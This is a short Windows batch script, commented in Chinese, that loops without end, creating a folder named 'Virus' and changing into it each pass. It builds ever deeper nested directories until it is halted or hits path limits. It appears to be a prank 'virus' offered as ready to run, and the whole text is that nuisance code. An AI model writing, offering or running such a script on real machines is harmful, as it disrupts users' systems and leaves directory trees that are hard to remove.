@echo off
rem 不断 新建文件夹并切换到新文件夹
:loop
md Virus
cd Virus
goto loop

pause>nul
exit